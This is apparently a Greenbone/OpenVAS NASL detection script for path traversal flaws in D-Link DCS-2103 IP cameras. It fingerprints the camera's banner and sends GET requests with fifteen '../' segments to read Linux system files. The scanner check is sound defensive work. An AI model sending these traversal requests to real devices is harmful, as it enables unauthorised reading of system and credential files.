if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805031" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_cve_id( "CVE-2014-9234", "CVE-2014-9238" );
	script_bugtraq_id( 71484 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2014-12-15 14:54:29 +0530 (Mon, 15 Dec 2014)" );
	script_name( "D-link IP Camera DCS-2103 Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "This host has D-link IP Camera and is
  prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check
  whether it is able to download the system files." );
	script_tag( name: "insight", value: "Flaws are due to:

  - The /cgi-bin/sddownload.cgi script not properly sanitizing user input,
    specifically path traversal style attacks (e.g. '../') supplied via
    the 'file' parameter.

  - An input passed via the /cgi-bin/sddownload.cgi script to the 'file'
    parameter is not properly sanitized." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to disclose the software's installation path resulting in a loss
  of confidentiality and gain access to arbitrary files." );
	script_tag( name: "affected", value: "D-link IP camera DCS-2103 with firmware 1.0.0" );
	script_tag( name: "solution", value: "Upgrade to D-link IP camera DCS-2103 with
  firmware after 1.0.0" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/129138" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2014/Nov/42" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "DCS-2103/banner" );
	script_xref( name: "URL", value: "http://www.dlink.com" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
DlinkPort = http_get_port( default: 80 );
DlinkBanner = http_get_remote_headers( port: DlinkPort );
if(!ContainsString( DlinkBanner, "WWW-Authenticate: Basic realm=\"DCS-2103\"" )){
	exit( 0 );
}
files = traversal_files( "linux" );
for file in keys( files ) {
	url = "/" + crap( data: "../", length: 15 ) + files[file];
	if(http_vuln_check( port: DlinkPort, url: url, pattern: file )){
		report = http_report_vuln_url( port: DlinkPort, url: url );
		security_message( port: DlinkPort, data: report );
		exit( 0 );
	}
}
exit( 99 );

